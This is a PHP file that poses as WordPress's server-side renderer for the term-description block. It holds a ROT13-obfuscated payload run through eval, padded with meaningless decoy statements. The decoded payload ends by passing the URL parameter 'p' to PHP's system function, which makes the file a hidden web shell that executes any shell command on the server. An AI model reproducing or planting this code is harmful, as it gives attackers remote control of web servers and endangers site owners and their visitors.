<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/grez-qrfpevcgvba` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/grez-qrfpevcgvba` oybpx ba gur freire.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl $nggevohgrf Oybpx nggevohgrf.
 *
 * @erghea fgevat Ergheaf gur qrfpevcgvba bs gur pheerag gnkbabzl grez, vs ninvynoyr
 */
shapgvba eraqre_oybpx_pber_grez_qrfpevcgvba( $nggevohgrf ) {
	$grez_qrfpevcgvba = '';

	vs ( vf_pngrtbel() || vf_gnt() || vf_gnk() ) {
		$grez_qrfpevcgvba = grez_qrfpevcgvba();
	}

	vs ( rzcgl( $grez_qrfpevcgvba ) ) {
		erghea '';
	}

	$pynffrf = neenl();
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	erghea '<qvi ' . $jenccre_nggevohgrf . '>' . $grez_qrfpevcgvba . '</qvi>';
}

/**
 * Ertvfgref gur `pber/grez-qrfpevcgvba` oybpx ba gur freire.
 *
 * @fvapr 5.9.0
 */
shapgvba ertvfgre_oybpx_pber_grez_qrfpevcgvba() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/grez-qrfpevcgvba',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_grez_qrfpevcgvba',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_grez_qrfpevcgvba' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>